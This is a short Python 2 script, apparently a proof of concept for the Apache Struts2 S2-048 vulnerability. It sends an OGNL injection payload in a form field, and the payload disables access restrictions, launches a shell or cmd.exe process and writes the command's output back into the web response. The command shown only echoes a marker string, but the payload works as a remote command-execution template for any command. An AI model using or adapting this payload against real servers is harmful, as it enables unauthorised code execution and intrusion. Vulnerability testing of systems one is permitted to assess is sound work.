#!/usr/bin/python  
#coding=utf-8  

'''
s2-048 poc
'''

import urllib  
import urllib2  
  
def post(url, data):  
    req = urllib2.Request(url)  
    data = urllib.urlencode(data)  
    #enable cookie  
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())  
    response = opener.open(req, data)  
    return response.read()  
  
def main():  
    posturl = "  "  # ------ test-url  --------
    data = {'name':"${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='echo s2-048-EXISTS').(#iswin=(@\u006Aava.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}", 'age':'bbb', '__checkbox_bustedBefore':'true', 'description':'ccc'}  
    res = post(posturl, data)[:100]
    if 's2-048-EXISTS' in res:
        print posturl, 's2-048 EXISTS'
    else:
        print posturl, 's2-048 do not EXISTS'
  
if __name__ == '__main__':  
    main()